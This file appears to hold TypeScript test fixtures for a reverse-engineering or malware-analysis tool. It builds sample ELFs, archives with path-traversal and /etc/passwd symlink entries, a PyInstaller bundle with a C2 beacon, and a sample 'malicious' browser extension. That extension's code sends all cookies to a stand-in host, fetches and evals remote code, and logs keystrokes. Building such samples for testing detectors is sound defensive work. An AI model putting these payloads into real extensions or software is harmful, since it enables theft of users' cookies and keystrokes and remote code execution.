import fs from 'fs';
import path from 'path';
import { execFileSync } from 'child_process';

export const testRoot = () => process.env.WEB_RE_TEST_ROOT!;

export function fixtureDir(name: string): string {
  const dir = path.join(testRoot(), 'fixtures', name);
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

export function hasTool(cmd: string): boolean {
  try {
    execFileSync('which', [cmd], { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
}

function python(script: string, ...args: string[]) {
  execFileSync('python3', ['-I', '-c', script, ...args], { stdio: 'pipe' });
}

// Small ELF with a recognizable main/helper pair; static so UPX accepts it
export function buildHelloElf(dir: string, opts: { static?: boolean } = {}): string {
  const src = path.join(dir, 'hello.c');
  const out = path.join(dir, opts.static ? 'hello_static' : 'hello');
  fs.writeFileSync(
    src,
    '#include <stdio.h>\n__attribute__((noinline)) int helper(int a){return a*7+3;}\n' +
      'int main(int c,char**v){printf("connect to http://198.51.100.23/beacon %d\\n",helper(c));return 0;}\n'
  );
  execFileSync('gcc', ['-O1', ...(opts.static ? ['-static'] : []), '-o', out, src]);
  return out;
}

export function buildUpxElf(dir: string): string {
  const plain = buildHelloElf(dir, { static: true });
  const packed = path.join(dir, 'hello_upx');
  fs.copyFileSync(plain, packed);
  execFileSync('upx', ['-q', packed], { stdio: 'ignore' });
  return packed;
}

export function buildTarGz(dir: string, entries: Record<string, string>, opts: { evil?: 'dotdot' | 'symlink' } = {}): string {
  const out = path.join(dir, `${opts.evil ?? 'good'}.tar.gz`);
  python(
    `import sys,tarfile,io,json
entries=json.loads(sys.argv[2]); evil=sys.argv[3]
with tarfile.open(sys.argv[1],'w:gz') as t:
    for n,d in entries.items():
        b=d.encode(); ti=tarfile.TarInfo(n); ti.size=len(b); t.addfile(ti,io.BytesIO(b))
    if evil=='dotdot':
        ti=tarfile.TarInfo('../escaped.js'); ti.size=1; t.addfile(ti,io.BytesIO(b'x'))
    if evil=='symlink':
        ti=tarfile.TarInfo('passwd'); ti.type=tarfile.SYMTYPE; ti.linkname='/etc/passwd'; t.addfile(ti)`,
    out,
    JSON.stringify(entries),
    opts.evil ?? ''
  );
  return out;
}

export function buildZip(dir: string, name: string, entries: Record<string, string>, opts: { symlink?: boolean; bigZeroesMb?: number } = {}): string {
  const out = path.join(dir, name);
  python(
    `import sys,zipfile,json,stat
entries=json.loads(sys.argv[2]); symlink=sys.argv[3]=='1'; big=int(sys.argv[4])
with zipfile.ZipFile(sys.argv[1],'w',zipfile.ZIP_DEFLATED) as z:
    for n,d in entries.items(): z.writestr(n,d)
    if symlink:
        zi=zipfile.ZipInfo('evil.js'); zi.create_system=3; zi.external_attr=(stat.S_IFLNK|0o777)<<16; z.writestr(zi,'/etc/passwd')
    if big:
        with z.open('big.bin','w',force_zip64=True) as f:
            for _ in range(big): f.write(b'\\0'*(1<<20))`,
    out,
    JSON.stringify(entries),
    opts.symlink ? '1' : '0',
    String(opts.bigZeroesMb ?? 0)
  );
  return out;
}

// Electron asar with a nested file, an "unpacked" entry, a symlink and a hostile ".." name
export function buildAsar(dir: string): string {
  const out = path.join(dir, 'app.asar');
  const main = Buffer.from('console.log("asar main")\n');
  const util = Buffer.from('module.exports = "https://updates.example-c2.net/check"\n');
  const header = {
    files: {
      'main.js': { size: main.length, offset: '0' },
      lib: { files: { 'util.js': { size: util.length, offset: String(main.length) } } },
      'native.node': { size: 10, offset: '0', unpacked: true },
      lnk: { link: 'main.js' },
      '..': { size: 1, offset: '0' },
    },
  };
  const json = Buffer.from(JSON.stringify(header));
  const pad = (4 - (json.length % 4)) % 4;
  const pickle = Buffer.concat([Buffer.alloc(8), json, Buffer.alloc(pad)]);
  pickle.writeUInt32LE(json.length + 4 + pad, 0);
  pickle.writeUInt32LE(json.length, 4);
  const head = Buffer.alloc(8);
  head.writeUInt32LE(4, 0);
  head.writeUInt32LE(pickle.length, 4);
  fs.writeFileSync(out, Buffer.concat([head, pickle, main, util]));
  return out;
}

// A PYZ exactly as PyInstaller lays it out, produced by this machine's real Python marshal
export function buildPyz(dir: string): string {
  const out = path.join(dir, 'PYZ-00.pyz');
  python(
    `import sys,marshal,zlib,struct,importlib.util
mods={'evilpkg':(1,'X=1'),'evilpkg.beacon':(0,'URL="http://203.0.113.9/c2"\\ndef ping():\\n    return URL'),'json':(0,'pass')}
body=b''; toc=[]; off=12+4
for name,(typ,src) in mods.items():
    data=zlib.compress(marshal.dumps(compile(src,name,'exec')))
    toc.append((name,(typ,off,len(data)))); body+=data; off+=len(data)
tocbytes=marshal.dumps(toc)
with open(sys.argv[1],'wb') as f:
    f.write(b'PYZ\\0'+importlib.util.MAGIC_NUMBER+struct.pack('!i',12+4+len(body))+b'\\0'*4+body+tocbytes)`,
    out
  );
  return out;
}

// ---- Browser extensions ----

function zipDir(files: Record<string, string>, out: string, prefix = '') {
  python(
    `import sys,zipfile,json
files=json.loads(sys.argv[2]); prefix=sys.argv[3]
with zipfile.ZipFile(sys.argv[1],'w',zipfile.ZIP_DEFLATED) as z:
    for n,d in files.items(): z.writestr(prefix+n,d)`,
    out,
    JSON.stringify(files),
    prefix
  );
}

const obfuscated = `var _0x1a2b=['\\x68\\x65\\x6c\\x6c\\x6f'];` + Array.from({ length: 60 }, (_, i) => `var _0x${(0x4e00 + i).toString(16)}=_0x1a2b[0];`).join('');

export const maliciousExtensionFiles: Record<string, string> = {
  'manifest.json': JSON.stringify({
    // Chrome tolerates comments; the parser must too
    manifest_version: 3,
    name: '__MSG_appName__',
    default_locale: 'en',
    version: '2.4.1',
    permissions: ['cookies', 'tabs', 'storage', 'scripting', 'declarativeNetRequest', 'management'],
    host_permissions: ['<all_urls>'],
    background: { service_worker: 'bg.js' },
    content_scripts: [{ matches: ['<all_urls>'], js: ['content.js'], run_at: 'document_start', all_frames: true }],
    update_url: 'https://updates.shady-cdn.example/ext.xml',
    externally_connectable: { matches: ['*://*/*'] },
  }).replace('{', '{ // comment\n'),
  '_locales/en/messages.json': JSON.stringify({ appName: { message: 'Super PDF Helper' } }),
  'bg.js': [
    'chrome.cookies.getAll({}, (c) => fetch("https://collect.shady-cdn.example/c", { method: "POST", body: JSON.stringify(c) }));',
    'chrome.management.setEnabled("someid", false);',
    'fetch("https://cfg.shady-cdn.example/p.js").then(r => r.text()).then(code => eval(code));',
    'chrome.tabs.query({}, t => t);',
  ].join('\n'),
  'content.js': [
    'document.addEventListener("keydown", e => buf.push(e.key));',
    'const pw = document.querySelectorAll("input[type=password]");',
    'navigator.sendBeacon("https://k.shady-cdn.example/k", buf.join(""));',
  ].join('\n'),
  'lib/o.js': obfuscated,
};

export const benignExtensionFiles: Record<string, string> = {
  'manifest.json': JSON.stringify({
    manifest_version: 2,
    name: 'Hello Badge',
    version: '1.0',
    description: 'Shows a badge',
    permissions: ['storage'],
    browser_specific_settings: { gecko: { id: 'hello-badge@example.org' } },
    background: { scripts: ['bg.js'] },
  }),
  'bg.js': 'browser.browserAction.setBadgeText({ text: "hi" });\n',
};

// CRX3: "Cr24", version 3, header length, (opaque) header bytes, then the zip
export function buildCrx(dir: string, files: Record<string, string>): string {
  const zip = path.join(dir, 'ext.zip');
  zipDir(files, zip);
  const header = Buffer.from('fake-protobuf-header-with-signatures');
  const prefix = Buffer.alloc(12);
  prefix.write('Cr24', 0, 'latin1');
  prefix.writeUInt32LE(3, 4);
  prefix.writeUInt32LE(header.length, 8);
  const out = path.join(dir, 'ext.crx');
  fs.writeFileSync(out, Buffer.concat([prefix, header, fs.readFileSync(zip)]));
  return out;
}

export function buildXpi(dir: string, files: Record<string, string>, opts: { subfolder?: string } = {}): string {
  const out = path.join(dir, opts.subfolder ? 'ext-folder.zip' : 'ext.xpi');
  zipDir(files, out, opts.subfolder ? `${opts.subfolder}/` : '');
  return out;
}
